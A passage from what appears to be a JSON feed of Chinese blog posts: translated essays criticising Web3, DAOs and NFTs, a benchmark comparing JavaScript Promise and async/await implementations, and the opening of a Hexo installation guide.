位比特），其状态在全球每个以太坊矿工之间共享，其输入和输出是代币，要么是可替代的（如以太坊货币），要么是不可替代的。</p>\n<p>通过智能合约在区块链上永久存储硬规则的组织，你可以在项目上花费任何货币之前强制要求投票。所说的投票（以及代码和资金和其他一切）将是完全透明的，而且组成 DAO 的智能合约将是不可改变的。</p>\n<p>虽然我可以讨论智能合约的优点，但是不可忽视的就是他们的陷阱。例如，最大的 DAO —— <a href=\"https://en.wikipedia.org/wiki/The_DAO_(organization)\">The DAO</a>，在上线伊始就因为代码 Bug 而被黑客攻击、所有的资金全部化为乌有，以太坊网络被迫硬分叉来保护投资者的合约。当然，相比继续讨论 DAO 的失败案例，我们还是讨论一下这些实践是如何运作的吧。</p>\n<h3>案例分析：Reddit 社区代币</h3>\n<p>让我们把这一切带回我们开始的地方：Web3 的趋势与互联网上的社交媒体巨头。正如我之前所说，Reddit 是最有兴趣加入 DAO 并开始称自己为 「去中心化」的网站，所以我们将从那里开始。</p>\n<p>这里要做的明显比较是，Reddit 是一个类似于 Usenet 的中心化网站。Reddit 承载着 Subreddit，并提供审核工具，既包括 Upvote / Downvote 的形式，也包括实际的版主形式。在 Reddit 上，严格禁止操纵 Upvote / Downvote 的行为，网站管理员使用自动化工具禁止任何人这样做。这为子版块的社区创造了一种决定哪些内容是最好的方式，并将这些优质内容推广到前面，无论他们是一个偶然的潜水者还是一个活跃的成员发表的。这是 Reddit 运作的基础，到目前为止，它运作得相当好。</p>\n<p>随着社区积分的引入，Reddit 声称他们允许会员「拥有他们喜欢的社区的一部分」，就像股东拥有他们喜欢的公司的一部分一样。积分是衡量声誉的一个标准，是用于投票或福利的货币，如徽章、表情符号、GIF 等，以炫耀你的财富。投票是不具约束力的公投，采用一人一票和每点一票的方式计算。在投票过程中，积分不会被消耗。每隔四周，Reddit 网站会公布每个用户的名单，他们获得了多少 Karma，以及他们将获得多少积分作为补偿。对这个名单的修改可以用积分投票的方法提出。</p>\n<p>这里应该很明显的一点是，这根本就不是去中心化。因为你甚至不能在 Reddit 的系统中投票选举新版主。当然，你也不能建立属于你自己的 Subreddit，并在那里建立一个社区；或者从 Reddit 主网络中分叉出来，创建一套新的独立子版块；或者规避 Reddit 网站管理员的意愿；或者逃避 Reddit 是一个需要盈利的企业的事实、而让用户购买假的互联网积分、并让用户产生自己拥有控制的错觉。</p>\n<h3>案例分析：Decentraland</h3>\n<p><img src=\"https://npm.elemecdn.com/sks@0.6.2/decentraland.jpg\" alt=\"decentraland.png\" width=\"1207\" height=\"682\"></p>\n<p>抛开 Reddit，现在让我们请出 <a href=\"https://decentraland.org/\">Decentraland</a>。这是一个用于创建虚拟世界的 DAO，这个概念如今也被称为「元宇宙」。</p>\n<p>Decentraland 允许用户对 Decentraland 生态系统内的各种政策和变量进行投票，例如增加新的可穿戴设备，对某些项目的拨款，市场费用，允许使用的基础设施等。还存在一个安全顾问委员会、有权力扔掉现有的合约、改用修复了漏洞的合约。<a href=\"https://governance.decentraland.org/\">你可以在这里查看这些提案的一些例子</a>。一个特别有趣的是这个拨款提案，<a href=\"https://governance.decentraland.org/proposal/?id=47e1bb80-4139-11ec-be0c-afec86cba5e5\">以增加对一个被称为 IPSME 的元宇宙协议的支持</a>，这是我想改天进一步调查的事情。</p>\n<p>Decentraland 从根本上说是在一个被称为 MANA 的可替换代币上运行的，它被用于所有系统内的交易。虽然投票是使用 <a href=\"https://docs.snapshot.org/\">Snapshot</a> 进行的，没有交易费用（Gas），<a href=\"https://docs.decentraland.org/decentraland/what-do-you-need-to-participate/\">但你的投票权是由你拥有的游戏中的货币数量加权的</a>。这（在理论上）<strong>使已建立的富裕用户比新建立的贫穷账户更重要</strong>，使用的系统非常类似于标准加密货币中的股权证明工作。</p>\n<p>虽然我不能证明 Decentraland 遵循了这一点，但 DAO 中一个常见的投票结构是「<a href=\"https://en.wikipedia.org/wiki/Quadratic_voting\">平方投票法</a>」。这是为了判断一个人的偏好程度，而不是单纯的二元 是 / 否。通过对每一票收取幂等的货币 / 代币 / 金钱 / 等等(例如：1 票 = 1 美元，2 票 = 4 美元，3 票 = 8 美元，等等）。<strong>如果每个被投票的人都有一个固定的、一致的点数来分配给投票，那么这个方法就相当好，但如果把它与货币联系起来，你就会产生大量的问题。</strong></p>\n<p>举例说明，穷人只有更少的货币来表达他们的偏好。虽然一个穷人为了实现他们的诉求，愿意牺牲自己所有的一切，但是他们很容易就被一个有着相反偏好的富人所推翻。请看，非洲贫困国家缺乏公共交通、缺乏无障碍辅助设备、缺乏药物、缺乏纯净的饮用水和健康的食品供应。当地人并不是不需要这些东西，只是因为在富人们眼中，这些穷人的生活不值得被改善。 在美国，许多非白人的贫困社区因为「城市更新」政策被迫拆除、土地被用于修建高速公路，就是一个典型的例子。</p>\n<p>还有一个问题是，整个系统的模式是通过人为的稀缺性来获利。在 Decentraland 上的一票、一块土地、一件衣服或什么的，<strong>只是一系列的比特和字节，完全可以被自由复制或扩展</strong>。我特别厌恶 NFT 的主要原因是我对人工稀缺性的概念的厌恶，这种东西在 NFT 发明之前就已经困扰着数字世界，强硬的知识产权法充其量只是将大量的流行文化束缚在地下粉丝艺术家手中。我们的经济体系认为，自然和人类的创造物不是给世界的礼物，要负责任地和可持续地使用，而是作为资源被开发到其极限。自然，开发自然资源和荒谬的能源需求，仅仅是为了加强互联网上的物品的价值，这将是最终的结局，因为对我们来说，唯一重要的事情似乎是我们是否能从我们得到的礼物中产生投资回报。</p>\n<p>值得注意的是，我并非反对艺术家，出版社，版权委托书。我认为艺术印刷品在 Ko-Fi、Pateron 上付费是对创作伟大内容的回报，而不是一种贪婪地攫取金钱、希望从中获利的手段。<strong>NFT 正是因为无视艺术是情感的表达、是付诸了爱的劳动的概念，倾向于大规模生产垃圾赚快钱</strong>，才被我鄙视的。</p>\n<p>很明显，Decentraland 没有规定杜绝这种理念，除非硬分叉源代码，不做 Decentraland。如果  DAO 不能从平台上的交易费中获得足够的投资回报来继续运营，Decentraland 服务器本身也完全有可能倒闭。当然，<strong>所有的投票将主要由那些已经从 Decentraland 的方式中获益最多的人决定，他们对公平的竞争环境兴趣不大，而更愿意投票给那些给他们带来更多财富的东西，创造一个非常不平等和不公平的虚拟社会</strong>。</p>\n<p>我的最终结论是，Decentraland 是一个非常有趣的平台，<strong>但它有固有的等级制度，来自早期主要参与者积累的财富。</strong>从本质上讲，它和 Reddit 一样是一个单一的网站，拥有最多的代币的人就如 Reddit 的管理员和版主一样、凌驾于其他普通用户之上。如果 Decentraland 不使用区块链、将数据完全存储在 Decentraland 中心化的服务器上，或使用 Steam 钱包余额而不是 ERC-20 作为代币，以及通过纸质合同和法务部来执行公司内部的拨款，<strong>那么这个中心化的系统和现有的在区块链上运行的系统本质上仍然是完全相同的</strong>。如果 Decentraland 的服务器瘫痪，Decentraland 上的任何东西都没有价值；在它的生态之外，Decentraland 的任何东西也没有任何价值。简单地说，我不能真诚地称其拥有丝毫的去中心化。</p>\n<div class=\"license\">\n<div>[译] 不，Web3 不是去中心化</div>\n<div><a href=\"https://blog.skk.moe/post/web3-is-not-decentralization/\">https://blog.skk.moe/post/web3-is-not-decentralization/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2021-12-14</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/web3-is-not-decentralization/"},{"title":"[译] 捍卫自由的互联网，对 Web3 说不","date":"2021-12-12 13:40:00","description":"\n<h2>来自译者的楔子</h2>\n<p>作为一个充满泡沫和噱头的新概念，Web3 和元宇宙在区块链的社区中掀起了一波浪潮。鼓吹者坚信 Web3 就是互联网的未来、不惜砸下大把的金钱和精力、希望能在未来中捞一杯羹；而大部分人保持观望的态度。是时候来一点 Web3 的反对意见了。</p>\n<p>这篇译文将会作为我驳斥 Web3 的引子。在新的一年里，我会继续撰写评论文章、翻译来自区块链社区的观点，揭露 Web3 的谎言、戳破元宇宙的泡沫。</p>\n<blockquote><p>原文标题：Keep the web <strong>free</strong>, say <strong>no</strong> to <strong>Web3</strong><br>原文链接：<a href=\"https://yesterweb.org/no-to-web3/index.html\">https://yesterweb.org/no-to-web3/index.html</a><br>原文作者：<a href=\"https://yesterweb.org/\">Yesterday Web</a><br>译者：<a href=\"https://skk.moe/\">Sukka</a></p></blockquote>\n<p>Web3 被支持者称为一个想法、一个运动、新一代的互联网。</p>\n<p>Web3 被视为互联网的「未来」。这个概念由 <a href=\"https://www.sfchronicle.com/tech/article/Crypto-has-a-bro-problem-Women-in-the-field-say-16336453.php\">一群加密货币狂热者</a> 提出，基于现有的公共区块链。</p>\n<h2>Web3 声称其由社区管理</h2>\n<blockquote><p>虽然一个穷人为了实现他们的诉求，愿意牺牲自己所有的一切，但是他们很容易就被一个有着相反偏好的富人所推翻。请看，非洲贫困国家缺乏公共交通、缺乏无障碍辅助设备、缺乏药物、缺乏纯净的饮用水和健康的食品供应。当地人并不是不需要这些东西，只是因为在富人们眼中，这些穷人的生活不值得被改善。</p></blockquote>\n<p>许多 Web3 社区和加密货币有关社区都使用「<a href=\"https://en.wikipedia.org/wiki/Quadratic_voting\">平方投票法</a>」，即允许参与者表达他们对一个观点的偏好程度、而不是简单的「赞成」与「反对」。但是不幸的是，「你喜欢这个吗？」已经变成了「用你的钱告诉我，你有多喜欢这个」。换句话说，在决定 Web3 走向的道路中，参与者可以通过撒币来表达他们的诉求。</p>\n<p>InvisibleUp 的文章「<a href=\"https://invisibleup.com/articles/38/\">不，Web3 不是去中心化</a>」详细而有力地阐述了这个观点。</p>\n<h2>Web3 声称其是去中心化的</h2>\n<p>去中心化肯定是好事，但是加密货币和区块链绝对不是去中心化的唯一实现。请见 Soatok 发表在 Dhole Moments 上的文章「<a href=\"https://soatok.blog/2021/10/19/against-web3-and-faux-decentralization/\">Against Web3 and Faux-Decentralization</a>」。</p>\n<p>非常凑巧的是，Web3 的许多关键的「去中心化」基础设施都运行在由互联网巨头亚马逊提供的 中心化云计算服务 AWS 上（参见来自英国伍尔弗汉普顿大学的经济学家、数字货币投资者 Shaurya Malwa 发表的文章 「<a href=\"https://decrypt.co/44321/70-of-ethereum-nodes-are-hosted-on-centralized-services\">70% of Ethereum Nodes Are Hosted on Centralized Services</a>」），并且由「内幕人士」而非广大社区负责运营（参见区块链研究者、数字货币投资者 David Canellis 于 2019 年就以太坊硬分叉发表的评论文章「<a href=\"https://thenextweb.com/news/ethereum-insiders-fire-back-nodes\">Ethereum insiders deny there’s only one computer keeping a copy of its blockchain</a>」）。</p>\n<h2>Web3 声称要消除互联网的「中间人」</h2>\n<blockquote><p>想象一下，在 Web3 的倡议和提案中，用户将会真正拥有他们的数据。哇！那为什么像 Twitter 和 Facebook 的互联网巨头会允许有人破局呢？他们正在嫌赚的钱不够多呢！<br>—— Auzzie Jay。</p></blockquote>\n<p>Web3 的支持者缄口不谈他们将会如何消除被称为「中间人，Man in the Middle」的互联网巨头。不过，你如果想一下的话，他们刚刚好铲除了一个互联网巨头——Facebook，毕竟他们已经改名「元（Meta）」了，嗯。</p>\n<h2>Web3 声称要彻底杜绝数据泄露</h2>\n<p>不知道命运是否充满了讽刺，以太坊自己就因为数据泄露而损失了 5500 万美元（参见美国彭博社记者 Matthew Leising 出版的书籍「Out of the Ether: The Amazing Story of Ethereum and the $55 Million Heist That Almost Destroyed It All」、<a href=\"https://www.coindesk.com/tech/2020/09/17/the-55m-hack-that-almost-brought-ethereum-down/\">详细介绍了以太坊的历史、以及以太坊损失 5500 万美元的前后故事</a>）。</p>\n<p>Insider Inc. 签约作者 Carla Mozée 在四个月前（译者注：即 2021 年 8 月 31 日）发表了一篇文章「<a href=\"https://markets.businessinsider.com/news/currencies/cryptocurrency-hacks-fraud-cases-record-bitcoin-ethereum-wallets-breaches-defi-2021-8\">Cryptocurrency hacks and fraud are on track for a record number of incidents in 2021, data shows</a>」，详细介绍了过去八个月里发生的有关加密货币的非法集资、诈骗、黑客攻击事件、以及造成的损失。</p>\n<h2>Web3 声称要解决「双重开支」问题</h2>\n<blockquote><p>译者注：你可以把「双重开支」想象为开出的支票被复制，导致同一笔消费让你的账户被反复扣款。加密货币的 51% 攻击就是一个典型的「双重开支」问题。</p></blockquote>\n<p>加密货币并不能阻止「双重开支」问题，以至于社区为此发明了一个名词「51% 攻击」。当一个实体获得了整个区块链网络中超过 51% 的控制权，就能通过「最长链原则」控制这个区块链网络的走向、从而伪造交易。这种攻击是如此的普遍，以至于每年至少要发生一次，如 <a href=\"https://news.bitcoin.com/privacy-coin-verge-third-51-attack-200-days-xvg-transactions-erased/\">2018 年 Verge 遭遇三次 51% 攻击</a>、<a href=\"https://thehackernews.com/2019/01/ethereum-double-spend-attack.html\">2019 年以太坊经典遭遇双重开支攻击，损失达 110 万美元</a> 和 2020 年 <a href=\"https://cointelegraph.com/news/bitcoin-gold-blockchain-hit-by-51-attack-leading-to-70k-double-spend\">比特黄金遭遇 51% 攻击，导致了 7 万美元的双重开支</a>。</p>\n<p>所有区块链应用（不仅仅是加密货币）在设计时，都需要预防一个实体、或多个实体的组合控制超过一半的网络，但是 Web3 显然没有考虑到这一点。</p>\n<h2>Web3 从人为制造的稀缺性中获利</h2>\n<blockquote><p>为了获得最大的利润，生产者会限制生产、而不是确保对资源的最大化利用。</p></blockquote>\n<p>由于 Web3 和数字货币密切相关，因此不可避免地继承了数字货币「通过人为制造的稀缺性中获利」的本质。尽管「通过技术、生产或分享，理论上可以创造出无限丰富的数字化实体」，但是它们依然是稀缺的、控制在少数人手中。</p>\n<p>「人为制造的稀缺」是一个经典的经济学概念，你可以在 <a href=\"https://en.wikipedia.org/wiki/Artificial_scarcity\">Wikipedia 上读到浅显易懂的介绍</a>。</p>\n<h2>Web3 满足的是大鳄和投机者，而非整个互联网</h2>\n<p>React Native 应用开发者、Serverless 和 JAMstack 领域的专家、前 AWS 技术带头人 Nader Dabit 曾经在他的文章 <a href=\"https://www.freecodecamp.org/news/what-is-web3/\">What is Web3? The Decentralized Internet of the Future Explained</a> 中介绍了「与 Facebook 等互联网巨头不同」的公司会如何构建 Web3：</p>\n<ul>\n<li>宣发一个新的、令人激动的项目</li>\n<li>任何人都可以从第一天开始参与建设，或天使投资</li>\n<li>公司发布一些代币、10% 用于奖励早期建设者、10% 卖给天使投资人，剩下的留作未来开支的预算</li>\n<li>投资者和建设者 <strong>需要用代币来为项目的未来投票</strong>\n</li>\n<li><strong>谁拥有的代币越多，谁就有话语权</strong></li>\n</ul>\n<hr>\n<p>记住，任何推动 Web3 或是加密货币的人都是那些能从中获得真实利润的人，他们对互联网的未来毫不关心：</p>\n<ul>\n<li><a href=\"https://www.coindesk.com/tech/2021/08/26/microsoft-is-awarded-us-patent-for-crypto-token-creation-service/\">微软成功获得加密代币创建服务（Crypto Token Creation as a Service）的专利</a></li>\n<li><a href=\"https://thenextweb.com/news/nike-blockchain-sneakers-cryptokick-patent\">耐克现在拥有将区块链用于运动鞋的专利：CryptoKicks</a></li>\n<li><a href=\"https://adage.com/article/marketing-news-strategy/mcdonalds-gets-inito-nft-game-mcrib/2376996\">麦当劳发行 MCNFT 纪念 Mcrib 的回归</a></li>\n<li><a href=\"https://www.scmp.com/lifestyle/k-pop/article/3155551/nfts-and-cryptocurrency-draw-k-pop-labels-behind-bts-blackpink\">BTS、Blackpink、Twice 和其他团体背后的 K-Pop 寻求用 NFT 和加密货币来说服粉丝消费</a></li>\n<li><a href=\"https://cointelegraph.com/news/reddit-to-reportedly-tokenize-karma-points-and-onboard-500m-new-users\">Reddit 将其 5 亿用户的 Karma 转换为 ERC-20 代币</a></li>\n</ul>\n<p>Web3 只会进一步加剧贫富差距、加剧社会分层、加剧阶级隔阂。</p>\n<div class=\"license\">\n<div>[译] 捍卫自由的互联网，对 Web3 说不</div>\n<div><a href=\"https://blog.skk.moe/post/keep-web-free-say-no-to-web3/\">https://blog.skk.moe/post/keep-web-free-say-no-to-web3/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2021-12-12</div>\n</div>\n<div>              <div>更新于</div>\n<div>2021-12-13</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/keep-web-free-say-no-to-web3/"},{"title":"2021 年 JavaScript Promise 性能对比","date":"2021-12-07 08:19:00","description":"\n<p>我们正生活在一个「Any application that can be written in JavaScript, will eventually be written in JavaScript」的时代。作为一门兼具动态性和简单性的语言，JavaScript 已经占领了客户端、服务端，甚至在机器学习中也占据一席之地；不可避免的，异步执行也逐渐成为这门语言不可缺少的一部分。</p>\n<h2>TL; DR</h2>\n<ul>\n<li>Bluebird 依然是速度最快、内存占用最少的 Promise 实现</li>\n<li>Runtime 的 async / await 实现越来越快、顺序执行的性能已经超过 Native Promise，占用的内存也更少</li>\n<li>对于平行并发执行的 Promise，Bluebird 的性能依然一骑绝尘。编写运行在 Node.js 上的服务端程序仍然需要评估是否有必要引入 Bluebird</li>\n<li>所有对 Async / Await 的转译都不可避免的引入性能损耗；TypeScript Compiler（tsc）转译时引入的性能开销尤为明显，一般比原生 Async / Await 要慢至少两倍，同时要消耗更多的内存。</li>\n</ul>\n<h2>背景知识</h2>\n<h3>Node.js / v8 的 Promise 实现</h3>\n<p>关于 Bluebird vs Native，相信大部分读者肯定有一个问题：Bluebird 作为 Promise 的一个 JavaScript 实现，竟然会比 V8（Node.js 是基于 Chrome 的 V8 JavaScript 引擎的 Runtime）的 Native Promise 实现还快？</p>\n<p>实际上在 2017 年之前，<a href=\"https://github.com/v8/v8/blob/5.7.141/src/js/promise.js\">V8 的 Promise 也是用 JavaScript 实现的</a>、且并不完美，例如 <a href=\"https://github.com/v8/v8/blob/5.3.54/src/js/promise.js#L116-L119\">在 Promise 初始化时就分配数组给 Promise Handler</a> 导致不必要的内存占用；<a href=\"https://github.com/v8/v8/commit/1d4fe00287eabfb64d6bba51d685b2e668f179af\">V8 直到 2016 年 5 月才对此进行了优化</a>（V8 5.3.55）。<a href=\"https://github.com/v8/v8/commit/52e2c154ff18ae0e7ca807a5ad539750297c31b3#diff-9794588c64c777658e9ceb960f46260d0c49484ceb41e13dd1cc65ae1f05bd13\">V8 到 2016 年 12 月开始使用 C++ 实现 Promise</a>（V8 5.7.142）、在 Node.js 8 中落地（Node.js 7 使用的是 V8 5.5，Node.js 8 使用的是 V8 5.8）。</p>\n<h3>衡量 Promise 性能的方式</h3>\n<p><a href=\"https://blog.spion.dev/\">Gorgi Kosev</a> 在 2013 年 8 月发布了「<a href=\"https://blog.spion.dev/posts/analysis-generators-and-other-async-patterns-node.html\">Analysis of generators and other async patterns in node</a>」，详细介绍了 Generator Function，并与当时常见的异步实现（如 <code>Q.js</code>）、回调地狱的解决方案（<code>flatten.js</code>）的性能和编写难度进行了比较。Gorgi Kosev 提供了一段基于 Doxbee 的业务伪代码、涉及「数据库连接」「数据库事务回滚」「文件上传」「查询执行」等典型的 CRUD 和阻塞操作。后来，Bluebird 的作者为这段伪代码补充了一个 mock context，「Doxbee Benchmark」便成为了衡量 JavaScript 异步实现的性能的标准方法。V8 团队的 Maya Lekova 在 <a href=\"https://github.com/tc39/ecma262/pull/1250\">修改 ECMAScript Spec</a> 时，也使用了 Doxbee Benchmark 的数据来阐述修改的必要性。</p>\n<blockquote><p>顺便一提，早期 Promise 实现的性能完全无法入眼、一直被 JavaScript 开发者诟病，直到 2013 年 12 月 Petka Antonov 发布了 Bluebird 的首个版本，JavaScript 社区对 Promise 的印象才大幅改观。</p></blockquote>\n<h3>Bluebird 为什么这么快？</h3>\n<p>Bluebird 发布时，比同类实现快了将近 100 倍、内存占用却不到同类的十分之一；数年过去了，JavaScript 引擎的 JIT 不断进化（例如 V8 用 Turbofan 代替了 CrankShift），Bluebird 的性能依然在众多实现中出类拔萃脱颖而出。2016 年 Bluebird 的作者 Petka Antonov 写过一篇文章「<a href=\"https://www.reaktor.com/blog/javascript-performance-fundamentals-make-bluebird-fast/\">Three JavaScript performance fundamentals that make Bluebird fast</a>」，分享了三个简单且行之有效的 JavaScript 性能优化技巧。</p>\n<h2>Benchmark</h2>\n<p>此次 Benchmark 基于 V8 团队衡量 Async 优化、修改 ES Spec 时使用的 <a href=\"https://github.com/v8/promise-performance-tests/\">v8/promise-performance-tests</a> Benchmark Suite，额外增加了内存 RSS 统计，你可以前往 <a href=\"https://github.com/sukkaw/promise-performance-tests\">查看 Fork 后修改的版本</a>。</p>\n<p>运行环境为：</p>\n<pre><code class=\"hljs plaintext\">OS: Darwin 21.1.0 x64CPU: Intel(R) Core(TM) i9-9880H CPU @ 2.30GHz x 16Memory: 32768 MiB</code></pre>\n<h3>Bluebird vs Native Promise vs Native Async / Await</h3>\n<h4>顺序执行</h4>\n<p>顺序执行的 Promise 的特点是后一个 Promise 会用到前一个 Promise resolve 的值、只能在前一个 Promise fullfil 后执行：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> user = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/users/1'</span>);<span class=\"hljs-keyword\">const</span> job = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">`/api/jobs/<span class=\"hljs-subst\">${user.jobId}</span>`</span>);<span class=\"hljs-keyword\">const</span> colleagues = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">`/api/users/job/<span class=\"hljs-subst\">${job.id}</span>`</span>);</code></pre>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/1.png\" alt=\"1\" width=\"3061\" height=\"1815\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/2.png\" alt=\"2\" width=\"3066\" height=\"1815\"></p>\n<p><strong>从 Node.js 12 开始，async/await 异步顺序执行的速度最快、占用内存最少</strong>，和 Node.js 12 使用的 V8 版本包含 Fast Async 的 Patch 不无关系；同时，Bluebird 比 Native Promise 的速度要快，占用的内存也更少。</p>\n<h4>平行执行</h4>\n<p>平行执行的 Promise 特点是数个 Promise 之间不存在依赖关系；虽然 JavaScript 是单线程的，当一个 Promise（非阻塞地）从外部 Worker（如 Network、File I/O 等）等待响应数据时，Runtime 可以将下一个 Promise 塞入 Event Loop 中：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> userIds = [<span class=\"hljs-number\">21</span>, <span class=\"hljs-number\">42</span>, <span class=\"hljs-number\">84</span>, <span class=\"hljs-number\">168</span>];<span class=\"hljs-keyword\">const</span> users = <span class=\"hljs-keyword\">await</span> <span class=\"hljs-built_in\">Promise</span>.all(userIds.map(<span class=\"hljs-function\"><span class=\"hljs-params\">id</span> =&gt;</span> fetch(<span class=\"hljs-string\">`/api/users/<span class=\"hljs-subst\">${id}</span>`</span>)));</code></pre>\n<p>平行执行的 Promise 的特点是使用 <code>Promise.all</code> 或 <code>Promise.allSettled</code>；Bluebird 除 <code>Bluebird.all</code> 以外，还有 <code>Bluebird.map</code> 和 <code>Bluebird.join</code> 可被用于平行执行。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/3.png\" alt=\"3\" width=\"3066\" height=\"1815\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.9/4.png\" alt=\"4\" width=\"3052\" height=\"1782\"></p>\n<p>Bluebird 在平行执行时的性能一骑绝尘，比 Native 实现速度快 2~3 倍、内存占用却微不足道。</p>\n<h3>Native Promise vs JavaScript Promise</h3>\n<p>截至本文写就，绝大部分浏览器均已支持 Promise。但是如果要为古董浏览器如 IE 提供 Promise 支持，则依然需要使用 JavaScript 实现的 Polyfill。</p>\n<p>参与 Benchmark 的 Promise 实现有：</p>\n<ul>\n<li><a href=\"http://bluebirdjs.com/\">Bluebird</a></li>\n<li>\n<a href=\"https://github.com/zloirock/core-js\">core-js</a>（Babel、swc 都依赖的 polyfill 集合）</li>\n<li><a href=\"https://www.npmjs.com/package/es6-promise\">es6-promise@npm</a></li>\n<li><a href=\"https://www.npmjs.com/package/es6-promise-polyfill\">es6-promise-polyfill@npm</a></li>\n<li><a href=\"https://www.npmjs.com/package/promise\">promise@npm</a></li>\n<li><a href=\"https://www.npmjs.com/package/promise-polyfill\">promise-polyfill@npm</a></li>\n<li>\n<a href=\"https://www.npmjs.com/package/q\">Q.js</a>（支持 <code>new Q.Promise</code> 和 <code>Q.Promise</code> 两种使用方式，测试时调用不使用 <code>new</code>）</li>\n<li>\n<a href=\"https://www.npmjs.com/package/spromisemespeed\">SPromiseMeSpeed</a> （自称是最快的 Promise 实现、比 Bluebird 还快 2~548 倍）</li>\n<li><a href=\"https://www.npmjs.com/package/zousan\">Zousan</a></li>\n</ul>\n<h4>顺序执行</h4>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.8/5.png\" alt=\"5\" width=\"2905\" height=\"1824\"></p>\n<p>不出意外，Bluebird 顺序执行的性能比 Native 还要优秀，内存占用更是不到 Native 的 1/3；<code>core-js</code>、<code>SPromiseMeSpeed</code>、<code>promise@npm</code> 和 <code>es6-promise-polyfill@npm</code> 的性能与内存占用和 Native 实现接近。</p>\n<h4>平行执行</h4>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/6.png\" alt=\"6\" width=\"2905\" height=\"1828\"></p>\n<p>Bluebird 在平行执行上的表现依然一骑绝尘，<code>promise@npm</code> 也取得了类似的不凡成绩；而 <code>core-js</code> 等提供 Polyfill 则显得些许力不从心。</p>\n<h3>Async / Await</h3>\n<p>截止到本文写就，不支持 Async Function 的浏览器也已经屈指可数。如果要向下兼容仅支持 ES2016 甚至 ES5 的浏览器的话，依然需要通过转译的方式来模拟 Async Function 的行为。</p>\n<p>参与 Benchmark 的转译器有：</p>\n<ul>\n<li>\n<a href=\"https://babeljs.io/\">Babel</a> 默认使用的 <a href=\"https://www.npmjs.com/package/regenerator-runtime\"><code>regenerator-runtime</code></a>\n</li>\n<li>Babel 的一个非官方插件 <a href=\"https://www.npmjs.com/package/fast-async\">fast-async</a>\n</li>\n<li>Babel 的另一个非官方插件 <a href=\"https://www.npmjs.com/package/babel-plugin-transform-async-to-promises\">babel-plugin-transform-async-to-promises</a>\n</li>\n<li>\n<a href=\"https://www.typescriptlang.org/docs/handbook/2/basic-types.html#tsc-the-typescript-compiler\">tsc</a>，TypeScript 的官方 Compiler</li>\n</ul>\n<p>Benchmark 包括顺序执行（doxbee）、平行执行（parallel）和一个由 v8 提供的 Fibonacci 的计算测试：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>* <span class=\"hljs-title\">fibonacciSequence</span>(<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> a = <span class=\"hljs-number\">0</span>, b = <span class=\"hljs-number\">1</span>; ;) {    <span class=\"hljs-keyword\">yield</span> a;    <span class=\"hljs-keyword\">const</span> c = a + b;    a = b;    b = c;  }}<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">fibonacci</span>(<span class=\"hljs-params\">id, n</span>) </span>{  <span class=\"hljs-keyword\">for</span> <span class=\"hljs-keyword\">await</span> (<span class=\"hljs-keyword\">const</span> value <span class=\"hljs-keyword\">of</span> fibonacciSequence()) {    <span class=\"hljs-keyword\">if</span> (n-- === <span class=\"hljs-number\">0</span>) <span class=\"hljs-keyword\">return</span> value;  }};</code></pre>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/7.png\" alt=\"7\" width=\"3396\" height=\"2067\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/8.png\" alt=\"8\" width=\"3391\" height=\"2071\"></p>\n<div class=\"license\">\n<div>2021 年 JavaScript Promise 性能对比</div>\n<div><a href=\"https://blog.skk.moe/post/promise-performance-benchmark/\">https://blog.skk.moe/post/promise-performance-benchmark/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2021-12-07</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/promise-performance-benchmark/"},{"title":"在 Windows 上快速安装 Hexo · 安装 Git","date":"2021-11-12 13:30:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p><strong>本文未经允许，禁止转载！</strong></p>\n<p><strong>视频教程正在制作，等待更新。</strong></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95\" class=\"headerlink\" title=\"文章目录\"></a>文章目录</h3>\n<ul><li><a href=\"https://blog.yfun.top/posts/hexo-blog/install-git\">安装 Git</a></li></ul>\n<blockquote><p>更多文章等待更新...</p></blockquote>\n<h2>\n<a 